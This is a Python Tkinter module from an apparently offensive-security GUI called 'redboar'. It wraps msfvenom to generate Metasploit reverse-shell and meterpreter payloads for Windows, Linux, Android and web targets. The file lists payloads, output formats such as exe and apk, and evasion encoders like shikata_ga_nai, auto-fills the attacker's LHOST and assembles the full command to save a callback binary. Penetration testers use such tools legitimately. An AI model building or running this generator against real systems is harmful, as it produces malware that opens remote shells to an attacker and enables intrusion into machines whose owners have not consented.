import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import logging
import socket
import shlex

logger = logging.getLogger("redboar")

# Curated payload list
PAYLOADS = {
    "Windows": [
        "windows/meterpreter/reverse_tcp",
        "windows/meterpreter/reverse_https",
        "windows/meterpreter/bind_tcp",
        "windows/x64/meterpreter/reverse_tcp",
        "windows/x64/meterpreter/reverse_https",
        "windows/shell/reverse_tcp",
        "windows/shell_reverse_tcp"
    ],
    "Linux": [
        "linux/x86/meterpreter/reverse_tcp",
        "linux/x64/meterpreter/reverse_tcp",
        "linux/x86/shell/reverse_tcp",
        "linux/x64/shell_reverse_tcp"
    ],
    "Android": [
        "android/meterpreter/reverse_tcp",
        "android/meterpreter/reverse_https"
    ],
    "Web": [
        "php/meterpreter/reverse_tcp",
        "java/jsp_shell_reverse_tcp",
        "python/meterpreter/reverse_tcp"
    ]
}

FORMATS = {
    "Windows": ["exe", "dll", "msi"],
    "Linux": ["elf"],
    "Android": ["apk"],
    "Web": ["raw", "war", "aspx"]
}

ENCODERS = [
    "x86/shikata_ga_nai",
    "x64/xor_dynamic",
    "cmd/powershell_base64"
]

def get_local_ip():
    """Auto-detect local IP for LHOST."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "10.10.x.x"

def create_ui(parent_frame, app_instance):
    parent_frame.columnconfigure(1, weight=1)
    
    # Info Header
    info_frame = ttk.LabelFrame(parent_frame, text="MSFVenom Payload Factory", padding="6")
    info_frame.grid(row=0, column=0, columnspan=3, sticky="ew", padx=5, pady=(0,6))
    ttk.Label(
        info_frame,
        text="Generate malicious payloads for penetration testing. Requires msfvenom installed.\nSelect payload, configure options, and click Generate.",
        justify="left",
    ).pack(fill="x")
    
    # Payload Selection
    ttk.Label(parent_frame, text="Payload Category:").grid(row=1, column=0, sticky="w", padx=5, pady=2)
    app_instance.msf_category_var = tk.StringVar(value="Windows")
    cat_combo = ttk.Combobox(parent_frame, textvariable=app_instance.msf_category_var, 
                             values=list(PAYLOADS.keys()), state="readonly", width=15)
    cat_combo.grid(row=1, column=1, sticky="w", padx=5, pady=2)
    
    ttk.Label(parent_frame, text="Payload:").grid(row=2, column=0, sticky="w", padx=5, pady=2)
    app_instance.msf_payload_var = tk.StringVar()
    app_instance.msf_payload_combo = ttk.Combobox(parent_frame, textvariable=app_instance.msf_payload_var, 
                                                   values=PAYLOADS["Windows"], state="readonly", width=40)
    app_instance.msf_payload_combo.grid(row=2, column=1, columnspan=2, sticky="ew", padx=5, pady=2)
    
    def on_category_change(event=None):
        cat = app_instance.msf_category_var.get()
        app_instance.msf_payload_combo['values'] = PAYLOADS.get(cat, [])
        if PAYLOADS.get(cat):
            app_instance.msf_payload_var.set(PAYLOADS[cat][0])
        app_instance.msf_format_combo['values'] = FORMATS.get(cat, ["exe"])
        if FORMATS.get(cat):
            app_instance.msf_format_var.set(FORMATS[cat][0])
        app_instance.update_command_preview()
    
    cat_combo.bind("<<ComboboxSelected>>", on_category_change)
    app_instance.msf_payload_combo.bind("<<ComboboxSelected>>", app_instance.update_command_preview)
    
    # Config Frame
    conf_frame = ttk.LabelFrame(parent_frame, text="Configuration", padding="10")
    conf_frame.grid(row=3, column=0, columnspan=3, sticky="ew", padx=5, pady=5)
    conf_frame.columnconfigure(1, weight=1)
    
    ttk.Label(conf_frame, text="LHOST (Your IP):").grid(row=0, column=0, sticky="w", padx=5, pady=2)
    app_instance.msf_lhost_var = tk.StringVar(value=get_local_ip())
    ttk.Entry(conf_frame, textvariable=app_instance.msf_lhost_var, width=20).grid(row=0, column=1, sticky="w", padx=5, pady=2)
    app_instance.msf_lhost_var.trace_add("write", lambda *args: app_instance.update_command_preview())
    
    ttk.Label(conf_frame, text="LPORT:").grid(row=1, column=0, sticky="w", padx=5, pady=2)
    app_instance.msf_lport_var = tk.StringVar(value="4444")
    ttk.Entry(conf_frame, textvariable=app_instance.msf_lport_var, width=10).grid(row=1, column=1, sticky="w", padx=5, pady=2)
    app_instance.msf_lport_var.trace_add("write", lambda *args: app_instance.update_command_preview())
    
    ttk.Label(conf_frame, text="Format (-f):").grid(row=2, column=0, sticky="w", padx=5, pady=2)
    app_instance.msf_format_var = tk.StringVar(value="exe")
    app_instance.msf_format_combo = ttk.Combobox(conf_frame, textvariable=app_instance.msf_format_var, 
                                                  values=FORMATS["Windows"], state="readonly", width=10)
    app_instance.msf_format_combo.grid(row=2, column=1, sticky="w", padx=5, pady=2)
    app_instance.msf_format_combo.bind("<<ComboboxSelected>>", app_instance.update_command_preview)
    
    # Advanced Options
    adv_frame = ttk.LabelFrame(parent_frame, text="Advanced (Optional)", padding="10")
    adv_frame.grid(row=4, column=0, columnspan=3, sticky="ew", padx=5, pady=5)
    adv_frame.columnconfigure(1, weight=1)
    
    ttk.Label(adv_frame, text="Encoder (-e):").grid(row=0, column=0, sticky="w", padx=5, pady=2)
    app_instance.msf_encoder_var = tk.StringVar(value="")
    enc_combo = ttk.Combobox(adv_frame, textvariable=app_instance.msf_encoder_var, 
                             values=[""] + ENCODERS, width=30)
    enc_combo.grid(row=0, column=1, sticky="w", padx=5, pady=2)
    app_instance.msf_encoder_var.trace_add("write", lambda *args: app_instance.update_command_preview())
    
    ttk.Label(adv_frame, text="Iterations (-i):").grid(row=1, column=0, sticky="w", padx=5, pady=2)
    app_instance.msf_iterations_var = tk.StringVar(value="1")
    ttk.Entry(adv_frame, textvariable=app_instance.msf_iterations_var, width=5).grid(row=1, column=1, sticky="w", padx=5, pady=2)
    app_instance.msf_iterations_var.trace_add("write", lambda *args: app_instance.update_command_preview())
    
    ttk.Label(adv_frame, text="Bad Chars (-b):").grid(row=2, column=0, sticky="w", padx=5, pady=2)
    app_instance.msf_badchars_var = tk.StringVar(value="")
    ttk.Entry(adv_frame, textvariable=app_instance.msf_badchars_var, width=30).grid(row=2, column=1, sticky="ew", padx=5, pady=2)
    ttk.Label(adv_frame, text="(e.g., \\x00\\x0a\\x0d)").grid(row=2, column=2, sticky="w", padx=2)
    app_instance.msf_badchars_var.trace_add("write", lambda *args: app_instance.update_command_preview())
    
    # Generate Button
    btn_frame = ttk.Frame(parent_frame)
    btn_frame.grid(row=5, column=0, columnspan=3, pady=10)
    ttk.Button(btn_frame, text="Generate Payload", command=lambda: generate_payload(app_instance)).pack()
    
    # Trigger initial defaults
    on_category_change()
    
def build_command(app_instance):
    """Build msfvenom command list."""
    cmd = ["msfvenom"]
    
    payload = app_instance.msf_payload_var.get().strip()
    if not payload:
        raise ValueError("Payload is required.")
    
    cmd.extend(["-p", payload])
    
    lhost = app_instance.msf_lhost_var.get().strip()
    lport = app_instance.msf_lport_var.get().strip()
    
    if lhost:
        cmd.append(f"LHOST={lhost}")
    if lport:
        cmd.append(f"LPORT={lport}")
    
    fmt = app_instance.msf_format_var.get().strip()
    if fmt:
        cmd.extend(["-f", fmt])
    
    encoder = app_instance.msf_encoder_var.get().strip()
    if encoder:
        cmd.extend(["-e", encoder])
        
    iterations = app_instance.msf_iterations_var.get().strip()
    if iterations and iterations != "1":
        cmd.extend(["-i", iterations])
    
    badchars = app_instance.msf_badchars_var.get().strip()
    if badchars:
        cmd.extend(["-b", badchars])
    
    return cmd

def generate_payload(app):
    """Prompts user for save location and generates payload."""
    try:
        cmd = build_command(app)
    except ValueError as e:
        messagebox.showerror("Error", str(e))
        return
    
    # Prompt for save location
    fmt = app.msf_format_var.get()
    default_ext = f".{fmt}" if fmt else ".bin"
    filepath = filedialog.asksaveasfilename(
        title="Save Payload As",
        defaultextension=default_ext,
        filetypes=[(f"{fmt.upper()} File", f"*{default_ext}"), ("All Files", "*.*")]
    )
    
    if not filepath:
        return
    
    cmd.extend(["-o", filepath])
    
    # Log and run
    app.insert_output_line(f"[MSFVenom] Generating payload: {filepath}", ("info",))
    app.insert_output_line(f"[CMD] {shlex.join(cmd)}", ("info",))
    
    # Use app's run_tool if possible, or just show command
    messagebox.showinfo("Payload Generation", f"Command ready:\n\n{shlex.join(cmd)}\n\nPayload will be saved to:\n{filepath}")
    
    # If you want auto-execution via app.run_tool:
    # app.run_tool(cmd, "MSFVenom")
